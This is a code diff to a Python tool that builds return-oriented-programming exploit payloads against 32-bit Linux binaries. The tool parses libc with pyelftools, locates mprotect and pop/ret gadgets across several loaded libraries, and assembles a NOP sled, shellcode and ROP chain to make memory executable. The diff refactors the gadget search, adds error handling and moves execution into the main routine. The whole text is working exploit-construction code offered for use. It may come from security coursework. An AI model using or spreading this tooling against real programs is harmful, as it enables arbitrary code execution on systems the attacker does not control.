@@ -288,9 +288,12 @@ def pack_value(value):
     packed_value = struct.pack("<I", value)
     return packed_value
 
-def build_rop_chain_libc(disassembled_map):
+def build_rop_chain_libc(lib_list):
     libc_base_address = 0xb7e05000
-    f = open("/lib/i386-linux-gnu/libc.so.6")
+    f = open("/lib/i386-linux-gnu/libc.so.6", 'rb')
+    if f == None:
+        print 'libc library not found !'
+        exit(2)
     elffile = ELFFile(f)
 
     mprotect_offset = get_function_address(elffile, "mprotect")
@@ -301,11 +304,27 @@ def build_rop_chain_libc(disassembled_map):
 
     null_byte_location = pack_value(libc_base_address + find_null_byte(elffile))
 
-    pop2_ret_offset = find_pop2_ret(disassembled_map)
-    pop2_addr = pack_value(libc_base_address + pop2_ret_offset)
+    pop2_ret_offset = None
+    for entry in lib_list:
+        pop2_ret_offset = find_pop2_ret(entry[0])
+        if pop2_ret_offset != None:
+            pop2_addr = pack_value(entry[1] + pop2_ret_offset)
+            break    
 
-    pop3_ret_offset = find_pop3_ret(disassembled_map)
-    pop3_addr = pack_value(libc_base_address + pop3_ret_offset)
+    if pop2_ret_offset == None:
+        print 'Unable to find pop2_ret gadget !'
+        exit(1)
+    
+    pop3_ret_offset = None
+    for entry in lib_list:
+        pop3_ret_offset = find_pop3_ret(entry[0])
+        if pop3_ret_offset != None:
+            pop3_addr = pack_value(entry[1] + pop3_ret_offset)
+            break
+
+    if pop3_ret_offset == None:
+        print 'Unable to find pop3_ret gadget'
+        exit(2)
 
     memory_start_address = ((buf_address >> 12) << 12)
     memory_length = 0x1000
@@ -340,7 +359,7 @@ def build_rop_chain_libc(disassembled_map):
 
     rop_payload = nop_sled + packed_shellcode + 9 * ret_addr + rop_payload
 
-    return rop_payload
+    print_rop_payload(rop_payload) 
 
 def print_rop_payload(buf):
     rows, columns = os.popen('stty size', 'r').read().split()
@@ -374,7 +393,7 @@ def get_binary_instr(filename):
             initSec = elffile.get_section_by_name(b'.init')
             initStartAddr = initSec.header['sh_addr']
             initSection = initSec.data()
-            find_gadgets(initSection, initStartAddri, gadget_map, unique_gadget_map)
+            find_gadgets(initSection, initStartAddr, gadget_map, unique_gadget_map)
 
             pltSec = elffile.get_section_by_name(b'.plt')
             pltStartAddr = pltSec.header['sh_addr']
@@ -415,13 +434,6 @@ def find_library_base_addr(vuln_binary, library_path):
     os.remove("./test.gdb")
     return library_base_addr
 
-#/lib/ld-linux.so.2
-#mprotect-shellcode/vuln2
-#/lib/i386-linux-gnu/libc.so.6
-disas_map = get_binary_instr("/lib/i386-linux-gnu/libc.so.6")
-rop_payload = build_rop_chain_libc(disas_map)
-print_rop_payload(rop_payload)
-
 
 #------------main program changes-----------------
 if __name__ == '__main__':
@@ -453,3 +465,4 @@ if __name__ == '__main__':
         exit(2)
     lib_list.append((disas_map, 0, args.vuln_bin))
 
+    build_rop_chain_libc(lib_list)
